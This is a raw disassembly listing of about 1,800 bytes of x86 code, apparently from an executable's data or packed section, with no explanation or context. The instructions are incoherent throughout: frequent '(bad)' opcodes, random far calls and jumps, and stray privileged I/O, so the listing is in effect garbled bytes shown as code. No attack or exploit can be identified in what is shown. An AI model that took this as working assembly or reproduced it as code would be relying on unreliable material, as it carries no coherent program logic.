  41eb9c:	add    DWORD PTR [ecx*2+0x3a57d7d2],esi
  41eba3:	dec    ebp
  41eba4:	lods   eax,DWORD PTR ds:[esi]
  41eba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba6:	mov    bl,0xf1
  41eba8:	cmp    DWORD PTR [ebp-0x311d4393],eax
  41ebae:	enter  0x53cc,0xa8
  41ebb2:	shl    DWORD PTR [eax],0xfc
  41ebb5:	lahf   
  41ebb6:	push   ds
  41ebb7:	(bad)  
  41ebb9:	push   0xffffffb4
  41ebbb:	loop   0x41ebca
  41ebbd:	xchg   esi,eax
  41ebbe:	dec    ebx
  41ebbf:	dec    esp
  41ebc0:	cmp    eax,DWORD PTR [eax]
  41ebc2:	popa   
  41ebc3:	das    
  41ebc4:	push   ss
  41ebc5:	sti    
  41ebc6:	stos   BYTE PTR es:[edi],al
  41ebc7:	push   ss
  41ebc8:	jl     0x41eb67
  41ebca:	ins    BYTE PTR es:[edi],dx
  41ebcb:	sub    BYTE PTR [esi],cl
  41ebcd:	pop    es
  41ebce:	and    eax,0x9631e668
  41ebd3:	pop    esi
  41ebd4:	or     DWORD PTR [ebx-0x1c117358],edx
  41ebda:	je     0x41ec16
  41ebdc:	fld    DWORD PTR [esi-0x79]
  41ebdf:	dec    esp
  41ebe0:	fidivr WORD PTR [edx+0x1c]
  41ebe3:	push   cs
  41ebe4:	pop    esi
  41ebe5:	jmp    0x41ec42
  41ebe7:	mov    esp,0xf59c4cb9
  41ebec:	shl    BYTE PTR [edx],1
  41ebee:	add    ecx,DWORD PTR [esi-0x5d191a3f]
  41ebf4:	inc    eax
  41ebf5:	adc    eax,0x6059cb0c
  41ebfa:	enter  0x8bf4,0xf3
  41ebfe:	sahf   
  41ebff:	icebp  
  41ec00:	je     0x41ec67
  41ec02:	adc    al,0xdb
  41ec04:	call   0x354a:0x6d2d4708
  41ec0b:	sub    BYTE PTR [eax+0x59],bh
  41ec0e:	pop    ss
  41ec0f:	push   esp
  41ec10:	jbe    0x41ec83
  41ec12:	sub    eax,0xa77291d0
  41ec17:	aas    
  41ec18:	loope  0x41ec4c
  41ec1a:	push   eax
  41ec1b:	loop   0x41ec3a
  41ec1d:	aaa    
  41ec1e:	pop    eax
  41ec1f:	aad    0x66
  41ec21:	jo     0x41ec7b
  41ec23:	(bad)  
  41ec24:	sub    ah,BYTE PTR [esi+0x32]
  41ec27:	xchg   esp,eax
  41ec28:	sbb    ebx,edi
  41ec2a:	js     0x41ebdb
  41ec2c:	lahf   
  41ec2d:	or     al,0xd0
  41ec2f:	sub    edx,ebx
  41ec31:	retf   
  41ec32:	rcl    DWORD PTR [esi+edx*2-0x53],1
  41ec36:	ror    BYTE PTR [ebp-0x51],0x79
  41ec3a:	jno    0x41ebe8
  41ec3c:	pop    edi
  41ec3d:	(bad)  
  41ec3e:	out    0x54,al
  41ec40:	daa    
  41ec41:	cdq    
  41ec42:	mov    dh,0xdc
  41ec44:	sub    al,0x52
  41ec46:	xor    al,0xdd
  41ec48:	dec    esp
  41ec49:	outs   dx,DWORD PTR ds:[esi]
  41ec4a:	lahf   
  41ec4b:	mov    BYTE PTR [edi],dl
  41ec4d:	in     al,dx
  41ec4e:	jle    0x41ebd9
  41ec50:	and    DWORD PTR [ebx-0x7a],ebp
  41ec53:	retf   0x89ab
  41ec56:	or     bh,ah
  41ec58:	mov    gs:0xf059ed96,eax
  41ec5e:	adc    edx,DWORD PTR [eax-0x16]
  41ec61:	test   BYTE PTR [eax],ah
  41ec63:	iret   
  41ec64:	outs   dx,DWORD PTR ds:[esi]
  41ec65:	fsubr  DWORD PTR [ecx+0x9]
  41ec68:	test   al,0xde
  41ec6a:	jl     0x41ecb9
  41ec6c:	pop    ss
  41ec6d:	xor    BYTE PTR [ecx+ecx*2+0x47],cl
  41ec71:	pop    ebx
  41ec72:	inc    ebx
  41ec73:	xchg   esp,eax
  41ec74:	sbb    DWORD PTR [ebp+0x34],edi
  41ec77:	mov    ah,0xa
  41ec79:	or     al,0x18
  41ec7b:	leave  
  41ec7c:	loope  0x41ec25
  41ec7e:	mov    bh,0x23
  41ec80:	mov    al,0xb9
  41ec82:	scas   al,BYTE PTR es:[edi]
  41ec83:	jmp    0x586275f1
  41ec88:	cmp    eax,0x41d4a275
  41ec8d:	xchg   DWORD PTR [edi],eax
  41ec8f:	adc    eax,0x38cfe1f8
  41ec94:	mov    ?,WORD PTR [ecx]
  41ec96:	push   esi
  41ec97:	dec    ebx
  41ec98:	imul   esp,DWORD PTR [esi-0x2e65a456],0xffffff80
  41ec9f:	repz enterw 0xce55,0xe1
  41eca5:	adc    ah,BYTE PTR [ebx-0x59]
  41eca8:	inc    edi
  41eca9:	and    ch,bl
  41ecab:	sub    al,0x45
  41ecad:	fiadd  WORD PTR [edi+0x41]
  41ecb0:	dec    ebp
  41ecb1:	jno    0x41ec49
  41ecb3:	add    bl,BYTE PTR [edi]
  41ecb5:	adc    ah,bh
  41ecb7:	jmp    0x41ec8a
  41ecb9:	loop   0x41ed18
  41ecbb:	push   ebp
  41ecbc:	scas   al,BYTE PTR es:[edi]
  41ecbd:	pushf  
  41ecbe:	stos   DWORD PTR es:[edi],eax
  41ecbf:	ror    DWORD PTR [ecx-0x66],1
  41ecc2:	push   ss
  41ecc3:	push   edx
  41ecc4:	xchg   esi,eax
  41ecc5:	in     al,0x21
  41ecc7:	mov    eax,0x5326ddb6
  41eccc:	(bad)  
  41eccd:	lock push ss
  41eccf:	lea    esp,[esi+0x990882f]
  41ecd5:	popa   
  41ecd6:	inc    edx
  41ecd7:	cmp    ah,BYTE PTR [edx-0x4ef76ef7]
  41ecdd:	mov    cl,BYTE PTR [esi-0x1a]
  41ece0:	cdq    
  41ece1:	dec    edi
  41ece2:	push   esp
  41ece3:	pop    ebp
  41ece4:	mov    ds:0x7fbb8ab8,al
  41ece9:	ja     0x41ecab
  41eceb:	xlat   BYTE PTR ds:[ebx]
  41ecec:	jecxz  0x41ed5c
  41ecee:	mov    ?,WORD PTR [eax-0x74981590]
  41ecf4:	xchg   edi,eax
  41ecf5:	jo     0x41ed24
  41ecf7:	ja     0x41ed01
  41ecf9:	cld    
  41ecfa:	repz aaa 
  41ecfc:	dec    edi
  41ecfd:	adc    al,0xc2
  41ecff:	(bad)  
  41ed00:	xchg   esi,eax
  41ed01:	shl    DWORD PTR [ebx-0x4e],cl
  41ed04:	shr    DWORD PTR [eax+0x7a61bde8],1
  41ed0a:	or     BYTE PTR [edi],bl
  41ed0c:	fcomp  QWORD PTR ds:0x34aaeaf5
  41ed12:	sahf   
  41ed13:	dec    ebx
  41ed14:	or     al,0x32
  41ed16:	mov    dl,0xe3
  41ed18:	adc    al,0x8b
  41ed1a:	inc    ebx
  41ed1b:	jne    0x41ed55
  41ed1d:	inc    edi
  41ed1e:	jl     0x41ed04
  41ed20:	fistp  DWORD PTR [esp+edi*4]
  41ed23:	inc    edi
  41ed24:	pop    edx
  41ed25:	xchg   DWORD PTR [ebx+0x3860c6d5],ebx
  41ed2b:	rol    BYTE PTR [eax+esi*1],1
  41ed2e:	test   al,0xb0
  41ed30:	xor    al,0xeb
  41ed32:	push   ebp
  41ed33:	adc    esi,DWORD PTR [eax-0x19]
  41ed36:	xchg   edi,eax
  41ed37:	js     0x41ecd1
  41ed39:	inc    ecx
  41ed3a:	mov    edx,0x3603b080
  41ed3f:	not    BYTE PTR [eax]
  41ed41:	jno    0x41edb4
  41ed43:	out    dx,al
  41ed44:	aad    0x8e
  41ed46:	cmp    al,0xf3
  41ed48:	mov    cl,0x2a
  41ed4a:	push   ebx
  41ed4b:	cmp    al,BYTE PTR [eax+edx*4+0x68]
  41ed4f:	mov    bl,0xaa
  41ed51:	cld    
  41ed52:	xchg   esi,eax
  41ed53:	mov    bh,0xac
  41ed55:	pause  
  41ed57:	cmp    BYTE PTR [ebx-0x49],ah
  41ed5a:	(bad)  
  41ed5b:	xlat   BYTE PTR ds:[ebx]
  41ed5c:	xchg   esp,eax
  41ed5d:	(bad)  
  41ed5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed5f:	add    al,0x7a
  41ed61:	xchg   edx,eax
  41ed62:	xchg   ecx,eax
  41ed63:	sub    DWORD PTR [ecx+edi*2],ebx
  41ed66:	hlt    
  41ed67:	push   ss
  41ed68:	(bad)  
  41ed69:	pusha  
  41ed6a:	sti    
  41ed6b:	jp     0x41eddd
  41ed6d:	mov    ebp,0xc60574a
  41ed72:	inc    edx
  41ed73:	add    DWORD PTR [edi],edi
  41ed75:	and    DWORD PTR [eax-0x46c98bda],esp
  41ed7b:	test   eax,0xcb63c639
  41ed80:	add    esp,DWORD PTR [edx]
  41ed82:	pop    edi
  41ed83:	push   ecx
  41ed84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed85:	xor    DWORD PTR [eax-0x571604b1],ebx
  41ed8b:	test   eax,0xcd09003a
  41ed90:	xor    ah,BYTE PTR [ebx]
  41ed92:	pop    ebx
  41ed93:	cmp    al,0x94
  41ed95:	push   edx
  41ed96:	nop
  41ed97:	sti    
  41ed98:	aaa    
  41ed99:	add    ebp,esi
  41ed9b:	lds    edx,FWORD PTR [esi+0x3e]
  41ed9e:	sbb    eax,0xfe8a7611
  41eda3:	mov    BYTE PTR [edi+0x22],ch
  41eda6:	add    ecx,edi
  41eda8:	out    dx,al
  41eda9:	jge    0x41edf9
  41edab:	adc    BYTE PTR [edi-0x22],ch
  41edae:	popa   
  41edaf:	sub    edx,ebx
  41edb1:	dec    ebp
  41edb2:	add    dl,BYTE PTR [esi-0x20]
  41edb5:	iret   
  41edb6:	test   al,0xe
  41edb8:	frstor [ebx-0x2e]
  41edbb:	pop    es
  41edbc:	or     cl,BYTE PTR [ebx]
  41edbe:	ret    0x1139
  41edc1:	and    dh,bl
  41edc3:	enter  0xea45,0x58
  41edc7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edca:	cld    
  41edcb:	mov    esi,0xc5ea3443
  41edd0:	push   edx
  41edd1:	and    edi,DWORD PTR [eax-0x73]
  41edd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edd5:	out    dx,al
  41edd6:	ins    DWORD PTR es:[edi],dx
  41edd7:	in     eax,dx
  41edd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edd9:	sbb    bl,BYTE PTR ds:0x4b499fb3
  41eddf:	mov    WORD PTR [edx],fs
  41ede1:	mov    ebp,0xf5ada6d5
  41ede6:	push   ebx
  41ede7:	in     al,0x30
  41ede9:	shr    DWORD PTR [ebx+0x3a],cl
  41edec:	ins    DWORD PTR es:[edi],dx
  41eded:	mov    cl,0x15
  41edef:	push   0x4e0172bd
  41edf4:	fcom   DWORD PTR [ebx+0x78fb963e]
  41edfa:	dec    edi
  41edfb:	into   
  41edfc:	mov    edx,0x4de6b69f
  41ee01:	imul   ecx,ebx,0xffffff86
  41ee04:	mov    al,ds:0x65d754b1
  41ee09:	out    dx,al
  41ee0a:	cmp    esi,edi
  41ee0c:	mov    ds:0x5b3103d3,al
  41ee11:	inc    ecx
  41ee12:	or     ebx,DWORD PTR [eax+0x5c]
  41ee15:	sbb    DWORD PTR [edi+0x4b],0xffffffbc
  41ee19:	pop    ebp
  41ee1a:	xchg   DWORD PTR [eax+ebp*4-0x67],ebp
  41ee1e:	fbstp  TBYTE PTR [edx-0x67]
  41ee21:	ret    0x9d2a
  41ee24:	fs jne 0x41ee1b
  41ee27:	cs gs jnp 0x41ee63
  41ee2b:	outs   dx,BYTE PTR cs:[esi]
  41ee2d:	shl    DWORD PTR [edx+edi*8],cl
  41ee30:	push   ebp
  41ee31:	and    BYTE PTR [eax+0x2e6d4cfb],0x28
  41ee38:	pusha  
  41ee39:	test   BYTE PTR [esi+eiz*1+0x4b],bl
  41ee3d:	outs   dx,BYTE PTR fs:[esi]
  41ee3f:	pop    esi
  41ee40:	lahf   
  41ee41:	mov    eax,0x9287dac6
  41ee46:	dec    esi
  41ee47:	mov    ?,WORD PTR [eax+ebx*2+0x21f79270]
  41ee4e:	or     eax,0x9ec3e007
  41ee53:	xor    al,0x58
  41ee55:	or     eax,0x2a87d747
  41ee5a:	pop    ebx
  41ee5b:	out    0x7,al
  41ee5d:	fst    QWORD PTR [esi]
  41ee5f:	cmp    eax,0x403895e2
  41ee64:	out    dx,eax
  41ee65:	das    
  41ee66:	stc    
  41ee67:	cmc    
  41ee68:	xor    dh,dh
  41ee6a:	inc    edi
  41ee6b:	(bad)
  41ee6f:	outs   dx,BYTE PTR ds:[esi]
  41ee70:	jnp    0x41ee2d
  41ee72:	pusha  
  41ee73:	push   0x71
  41ee75:	mov    esp,ecx
  41ee77:	mov    esi,edi
  41ee79:	ret    0x24c4
  41ee7c:	in     eax,dx
  41ee7d:	imul   esi,esp,0x5
  41ee80:	loop   0x41ee99
  41ee82:	std    
  41ee83:	scas   al,BYTE PTR es:[edi]
  41ee84:	mov    ebx,0x3af774d4
  41ee8a:	retf   
  41ee8b:	and    DWORD PTR [ebx+0x14f62d0d],eax
  41ee91:	xor    edi,esi
  41ee93:	ret    
  41ee94:	and    eax,0x3f629a08
  41ee99:	xchg   edi,eax
  41ee9a:	pop    eax
  41ee9b:	or     edx,DWORD PTR [ebp+0x5758a241]
  41eea1:	in     al,dx
  41eea2:	lock mov ebp,0xc85bf
  41eea8:	adc    BYTE PTR [edi+0x5d],bh
  41eeab:	fcom   DWORD PTR [esi-0x5c]
  41eeae:	sbb    eax,0xebca27f
  41eeb3:	inc    esi
  41eeb4:	(bad)  [ebx]
  41eeb6:	call   0x1152:0x6daddfe7
  41eebd:	mov    esp,0x750e998c
  41eec2:	jmp    DWORD PTR [edi-0x78615ed]
  41eec8:	pop    ss
  41eec9:	test   DWORD PTR [ebp-0x7d],ebp
  41eecc:	jle    0x41ef0c
  41eece:	jbe    0x41ef0a
  41eed0:	fucomi st,st(0)
  41eed2:	retf   
  41eed3:	iret   
  41eed4:	loopne 0x41ee74
  41eed6:	jmp    0xc56516f1
  41eedb:	std    
  41eedc:	(bad)  
  41eede:	imul   BYTE PTR [esi]
  41eee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eee1:	sbb    al,0xad
  41eee3:	push   eax
  41eee4:	push   ds
  41eee5:	xchg   edi,eax
  41eee6:	cld    
  41eee7:	test   DWORD PTR [ecx+0x675aeeaf],edi
  41eeed:	adc    esi,DWORD PTR [ebp+0x409c46ac]
  41eef3:	retf   0x2ec3
  41eef6:	or     al,0x8e
  41eef8:	out    0x5e,eax
  41eefa:	es ja  0x41eef6
  41eefd:	cmc    
  41eefe:	dec    ebx
  41eeff:	jne    0x41ef63
  41ef01:	out    dx,eax
  41ef02:	in     al,0x3a
  41ef04:	ss sahf 
  41ef06:	(bad)  [esi]
  41ef08:	pop    ecx
  41ef09:	and    al,0x6e
  41ef0b:	repnz push ss
  41ef0d:	mov    dl,0x8b
  41ef0f:	dec    edx
  41ef10:	test   eax,0x43618d1f
  41ef15:	ins    BYTE PTR es:[edi],dx
  41ef16:	sbb    edi,DWORD PTR [esi+0x25eef829]
  41ef1c:	cmc    
  41ef1d:	fwait
  41ef1e:	popf   
  41ef1f:	call   0x3c55:0xe1cfb590
  41ef26:	pushf  
  41ef27:	(bad)  
  41ef28:	stos   DWORD PTR es:[edi],eax
  41ef29:	loope  0x41ef9b
  41ef2b:	ret    
  41ef2c:	push   ebx
  41ef2d:	xchg   BYTE PTR [ecx+edx*4+0x62],bh
  41ef31:	add    dh,BYTE PTR [ecx-0x7d476e6e]
  41ef37:	rol    DWORD PTR ds:0x20ae15cb,1
  41ef3d:	call   0x2:0xa3badcc3
  41ef44:	retf   0x96fb
  41ef47:	or     al,0x3b
  41ef49:	mul    DWORD PTR [ecx+eiz*4+0x1e]
  41ef4d:	cmp    ebx,DWORD PTR [ecx+0x46]
  41ef50:	jns    0x41ef37
  41ef52:	xchg   esi,eax
  41ef53:	scas   al,BYTE PTR es:[edi]
  41ef54:	or     dl,BYTE PTR [edi-0x4b]
  41ef57:	stos   DWORD PTR es:[edi],eax
  41ef58:	or     edi,edi
  41ef5a:	out    0xd8,al
  41ef5c:	pop    ss
  41ef5d:	ins    DWORD PTR es:[edi],dx
  41ef5e:	sub    edi,DWORD PTR [esi+edx*2]
  41ef61:	jns    0x41efb2
  41ef63:	outs   dx,BYTE PTR ds:[esi]
  41ef64:	dec    edi
  41ef65:	pop    edx
  41ef66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef67:	dec    edi
  41ef68:	cli    
  41ef69:	or     BYTE PTR [edi],bl
  41ef6b:	push   0xfffffff5
  41ef6d:	dec    ecx
  41ef6e:	xchg   ebx,eax
  41ef6f:	fadd   st(2),st
  41ef71:	xchg   ebx,eax
  41ef72:	jle    0x41ef24
  41ef74:	fs jecxz 0x41efc5
  41ef77:	push   ss
  41ef78:	fldcw  WORD PTR [esi]
  41ef7a:	leave  
  41ef7b:	pushf  
  41ef7c:	inc    esp
  41ef7d:	fisttp QWORD PTR [ecx+0x1b9aaffa]
  41ef83:	mov    bh,bh
  41ef85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef86:	js     0x41ef8e
  41ef88:	xor    bl,BYTE PTR [eax]
  41ef8a:	fist   WORD PTR [edi+0x7a]
  41ef8d:	aas    
  41ef8e:	and    DWORD PTR [edi],0x6204d631
  41ef94:	push   cs
  41ef95:	dec    esp
  41ef96:	cli    
  41ef97:	xchg   esp,eax
  41ef98:	push   ebx
  41ef99:	fidivr WORD PTR [ebx-0x16]
  41ef9c:	dec    edi
  41ef9d:	(bad)
  41efa1:	ds jl  0x41ef47
  41efa4:	jne    0x41efd1
  41efa6:	sti    
  41efa7:	jmp    0x491c07a0
  41efac:	mov    dh,0x16
  41efae:	not    dl
  41efb0:	xor    DWORD PTR [ebx],edx
  41efb2:	shr    ch,0x44
  41efb5:	lods   al,BYTE PTR ds:[esi]
  41efb6:	cmp    BYTE PTR [eax+edi*1+0x54c6325f],ah
  41efbd:	adc    eax,0xf10610d9
  41efc2:	mov    edi,0x759661d7
  41efc7:	sub    dh,BYTE PTR [edi]
  41efc9:	pop    edi
  41efca:	idiv   BYTE PTR [esi-0x6a]
  41efcd:	out    dx,eax
  41efce:	out    0x4a,eax
  41efd0:	es xchg edx,eax
  41efd2:	sub    al,0x59
  41efd4:	pop    ebp
  41efd5:	lahf   
  41efd6:	popf   
  41efd7:	es jns 0x41efcc
  41efda:	push   0xdfa3c001
  41efdf:	jmp    0x41f001
  41efe1:	sub    eax,0x8370cde
  41efe6:	sub    BYTE PTR [ebx-0x10],bl
  41efe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efea:	les    esi,FWORD PTR [esi+0x12]
  41efed:	pop    es
  41efee:	iret   
  41efef:	and    eax,0x9dc3c8ea
  41eff4:	xor    eax,edx
  41eff6:	je     0x41ef80
  41eff8:	adc    al,0xc9
  41effa:	mov    ah,0xd8
  41effc:	adc    al,0x3b
  41effe:	enter  0x21b,0xdf
  41f002:	push   0x860553ce
  41f007:	dec    ebx
  41f008:	and    ecx,DWORD PTR [eax]
  41f00a:	jnp    0x41efc5
  41f00c:	js     0x41f063
  41f00e:	adc    eax,0x75b227e2
  41f013:	scas   al,BYTE PTR es:[edi]
  41f014:	mov    cl,0x90
  41f016:	lea    ecx,[ecx+0x19]
  41f019:	inc    esi
  41f01a:	push   ds
  41f01b:	mov    esi,0xf150b258
  41f020:	leave  
  41f021:	jnp    0x41f000
  41f023:	cmp    al,0x4f
  41f025:	or     ecx,DWORD PTR gs:[edx-0x2116a598]
  41f02c:	pusha  
  41f02d:	push   edx
  41f02e:	xchg   edi,eax
  41f02f:	and    eax,0xb0e2a3a8
  41f034:	push   edi
  41f035:	mov    eax,0x9b4f3719
  41f03a:	in     al,0x28
  41f03c:	jb     0x41f04e
  41f03e:	std    
  41f03f:	mov    ebp,ss
  41f041:	mov    ch,0x13
  41f043:	ret    0x57cd
  41f046:	test   eax,0x13e770e0
  41f04b:	les    esp,FWORD PTR [eax+0x4bc903d6]
  41f051:	pop    eax
  41f052:	mov    eax,0x3e0ea54e
  41f057:	imul   esp,DWORD PTR [ebx],0xffffffef
  41f05a:	jge    0x41f043
  41f05c:	cmp    BYTE PTR [eax+0x6e],ah
  41f05f:	adc    al,0xbe
  41f061:	or     eax,0x47ef444f
  41f066:	loopne 0x41f073
  41f068:	cmp    eax,0x7e9a48ed
  41f06d:	mov    dl,0xdf
  41f06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f070:	inc    eax
  41f071:	out    dx,al
  41f072:	(bad)  [ebx]
  41f074:	push   0x44
  41f076:	mov    eax,ds:0xb564ca76
  41f07b:	jo     0x41f084
  41f07d:	mov    eax,ds:0x5c701a8f
  41f082:	jne    0x41f02b
  41f084:	imul   eax,DWORD PTR [esp+ebp*4-0x61],0xffffffe1
  41f089:	cmp    DWORD PTR [edx-0x42],esp
  41f08c:	iret   
  41f08d:	xor    BYTE PTR [edx-0xdc47c2e],bh
  41f093:	outs   dx,BYTE PTR ds:[esi]
  41f094:	jecxz  0x41f020
  41f096:	loope  0x41f01a
  41f098:	add    bh,bh
  41f09a:	pop    esp
  41f09b:	stos   DWORD PTR es:[edi],eax
  41f09c:	sbb    ah,BYTE PTR [ecx-0x4a124d1c]
  41f0a2:	xchg   edx,eax
  41f0a3:	pushw  ds
  41f0a5:	push   es
  41f0a6:	call   0xfba4:0x45f5b37a
  41f0ad:	lock aad 0xa6
  41f0b0:	push   ds
  41f0b1:	aaa    
  41f0b2:	nop
  41f0b3:	enter  0x456c,0x5e
  41f0b7:	or     edi,DWORD PTR [ebp+edi*2-0x4378991d]
  41f0be:	mov    ebx,0x23e64668
  41f0c3:	repnz sbb BYTE PTR [esi-0x16],dh
  41f0c7:	pop    ebx
  41f0c8:	ror    BYTE PTR [eax-0x57792cf1],1
  41f0ce:	icebp  
  41f0cf:	cs mov edx,0xbee40d10
  41f0d5:	sub    eax,0x2cfeb92b
  41f0da:	bound  edx,QWORD PTR ds:0xea804511
  41f0e0:	pop    ebp
  41f0e1:	mov    esi,0xd5d66d1f
  41f0e6:	pusha  
  41f0e7:	pop    esi
  41f0e8:	xchg   DWORD PTR [bx+si-0xf],esp
  41f0ec:	sbb    ebp,DWORD PTR [eax+edi*1]
  41f0ef:	push   es
  41f0f0:	xchg   edx,eax
  41f0f1:	sbb    eax,0xb405cc5c
  41f0f6:	dec    edx
  41f0f7:	aam    0xde
  41f0f9:	pop    ebp
  41f0fa:	fsub   st,st(7)
  41f0fc:	sub    eax,0x8d0b4fee
  41f101:	mov    dh,0xc3
  41f103:	mov    edx,0xef041fd2
  41f108:	xchg   esp,eax
  41f109:	test   DWORD PTR [ebx-0x6593ca54],ebx
  41f10f:	aas    
  41f110:	adc    eax,0x381163d3
  41f115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f116:	(bad)  
  41f117:	in     al,dx
  41f118:	mov    ch,0x15
  41f11a:	imul   ebp,DWORD PTR [edi+0x4a],0x53
  41f11e:	cmp    bh,bl
  41f120:	xor    al,0x82
  41f122:	sub    ecx,edi
  41f124:	jno    0x41f14d
  41f126:	adc    eax,DWORD PTR [ebx+edx*8]
  41f129:	jno    0x41f0b2
  41f12b:	(bad)  
  41f12c:	pop    esi
  41f12d:	nop
  41f12e:	mov    ecx,0x7fa980f5
  41f133:	out    dx,eax
  41f134:	setg   BYTE PTR [ebx+eax*8+0x34]
  41f139:	leave  
  41f13a:	les    ebp,FWORD PTR [ecx+0x4b458b6a]
  41f140:	js     0x41f183
  41f142:	test   BYTE PTR ds:0x499f31d2,al
  41f148:	inc    esi
  41f149:	mov    WORD PTR [ecx-0x24],es
  41f14c:	or     eax,0xd8c9fec3
  41f151:	sub    al,0x40
  41f153:	add    eax,0x8cae572d
  41f158:	test   DWORD PTR [edx+0x65],0x2b823de9
  41f15f:	xchg   ecx,eax
  41f160:	adc    edi,DWORD PTR [edx]
  41f162:	pop    ecx
  41f163:	jecxz  0x41f1d8
  41f165:	in     eax,dx
  41f166:	scas   eax,DWORD PTR es:[edi]
  41f167:	call   0x9202565c
  41f16c:	jo     0x41f195
  41f16e:	xchg   BYTE PTR ds:0x6f6fd4cd,dl
  41f174:	mov    ecx,DWORD PTR [ebp-0x53]
  41f177:	fdiv   QWORD PTR [edi]
  41f179:	add    eax,0x649a5655
  41f17e:	dec    ebp
  41f17f:	ja     0x41f1c9
  41f181:	push   ebp
  41f182:	push   ecx
  41f183:	add    ecx,edi
  41f185:	repnz pop edi
  41f187:	cmp    eax,0xe2c8cd0c
  41f18c:	xchg   ecx,eax
  41f18d:	arpl   WORD PTR [ebx+0xa],si
  41f190:	int3   
  41f191:	cmc    
  41f192:	sar    DWORD PTR [edi-0x5aa43fdd],0xb
  41f199:	mov    esi,0x4d4ac08c
  41f19e:	xchg   ecx,eax
  41f19f:	pop    edx
  41f1a0:	mov    esp,0xf3da8993
  41f1a5:	adc    BYTE PTR [esi+0x5397b89f],dl
  41f1ab:	dec    edx
  41f1ac:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41f1ae:	jp     0x41f1cc
  41f1b0:	aas    
  41f1b1:	xor    bh,bh
  41f1b3:	xchg   edi,eax
  41f1b4:	enter  0xfdf5,0x51
  41f1b8:	sbb    eax,0x794a3bd
  41f1bd:	sub    DWORD PTR [edx+0x5d821f5f],esp
  41f1c3:	les    esp,FWORD PTR [ebx+eax*8-0x39]
  41f1c7:	pop    ss
  41f1c8:	jb     0x41f22c
  41f1ca:	not    DWORD PTR [edi+0x43]
  41f1cd:	mov    dl,0x2c
  41f1cf:	jnp    0x41f1a9
  41f1d1:	dec    ecx
  41f1d2:	dec    ebx
  41f1d3:	jnp    0x41f204
  41f1d5:	retf   
  41f1d6:	mov    ebp,0xd1b450c3
  41f1db:	pushf  
  41f1dc:	push   ebp
  41f1dd:	dec    eax
  41f1de:	(bad)  
  41f1df:	lock lods al,BYTE PTR ds:[esi]
  41f1e1:	xchg   cl,bl
  41f1e3:	jmp    0xf7ce70a1
  41f1e8:	daa    
  41f1e9:	int3   
  41f1ea:	in     eax,0xa3
  41f1ec:	loopne 0x41f214
  41f1ee:	add    DWORD PTR [edx+0x32f06fb7],edx
  41f1f4:	cli    
  41f1f5:	push   0xffffffb8
  41f1f7:	rol    BYTE PTR [ebx-0x170727cc],1
  41f1fd:	mov    DWORD PTR [ecx-0x21f8f071],ecx
  41f203:	ret    
  41f204:	jmp    0x3575:0xa1b99170
  41f20b:	push   0xaa2da156
  41f210:	out    dx,al
  41f211:	pop    es
  41f212:	fs push es
  41f214:	aad    0xca
  41f216:	and    al,0xa
  41f218:	stos   BYTE PTR es:[edi],al
  41f219:	pop    ecx
  41f21a:	out    0xe2,al
  41f21c:	je     0x41f1ba
  41f21e:	and    eax,ebx
  41f220:	jle    0x41f25f
  41f222:	adc    al,0x1f
  41f224:	scas   eax,DWORD PTR es:[edi]
  41f225:	rol    DWORD PTR [edi],0xa3
  41f228:	aad    0x65
  41f22a:	adc    BYTE PTR ds:0xd9c1cfb0,dh
  41f230:	iret   
  41f231:	aad    0xff
  41f233:	sbb    al,0x7f
  41f235:	ins    BYTE PTR es:[edi],dx
  41f236:	pusha  
  41f237:	loope  0x41f295
  41f239:	or     BYTE PTR [ebp-0xe47123c],0x82
  41f240:	ss jo  0x41f223
  41f243:	mov    ds:0xd58f8c99,eax
  41f248:	cmp    esp,0x34
  41f24b:	mov    ebp,0x4b8771b0
  41f250:	test   dl,bh
  41f252:	test   BYTE PTR ds:0x934d56d0,0x10
  41f259:	nop
  41f25a:	dec    esp
  41f25b:	aas    
  41f25c:	mov    eax,DWORD PTR [edi]
  41f25e:	push   ecx
  41f25f:	test   al,0x4f
  41f261:	push   es
  41f262:	retf   0xc643
  41f265:	mov    cl,0x64
  41f267:	pop    ss
  41f268:	stc    
  41f269:	xchg   DWORD PTR [edx],esi
  41f26b:	jmp    0x41f292
  41f26d:	mov    bh,0x36
  41f26f:	dec    esi
  41f270:	or     bh,BYTE PTR [esi-0x26]
  41f273:	jns    0x41f2ae
  41f275:	mov    ebx,0xa8d99553
  41f27a:	and    BYTE PTR [ebx-0x65d3f7b2],cl
  41f280:	or     eax,0xdbd59937
  41f285:	inc    edx
  41f286:	out    dx,al
  41f287:	or     eax,0x6c003692
  41f28c:	test   eax,0x67cbfc94
  41f291:	jns    0x41f2d6
  41f293:	packssdw mm7,mm5
  41f296:	mov    ebp,0x1c4bcfc3
  41f29b:	(bad)  
  41f29c:	dec    esi
  41f29d:	fyl2x  
  41f29f:	cmp    bh,bl
  41f2a1:	add    al,0x6
  41f2a3:	ja     0x41f2af
  41f2a5:	xor    dh,BYTE PTR [esi]
  41f2a7:	sub    DWORD PTR [ecx+0x17b5ae4f],edi
  41f2ad:	sub    BYTE PTR [esi-0x42],0xd1
  41f2b1:	mov    ch,0xbb
  41f2b3:	sbb    al,BYTE PTR ds:0xbee07ff
  41f2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ba:	mov    ah,0x3d
  41f2bc:	xchg   esi,esi
  41f2be:	jge    0x41f2c7
  41f2c0:	mov    edi,?
  41f2c2:	mov    esi,es
  41f2c4:	sbb    ch,BYTE PTR [esi-0x1746a7c7]
  41f2ca:	clc    
  41f2cb:	jbe    0x41f2c7
  41f2cd:	push   edi
  41f2ce:	xchg   ecx,eax
  41f2cf:	or     DWORD PTR fs:[edx-0x5f],ebp
  41f2d3:	mov    ss,WORD PTR [edx]
  41f2d5:	icebp  
  41f2d6:	dec    eax
  41f2d7:	dec    edx
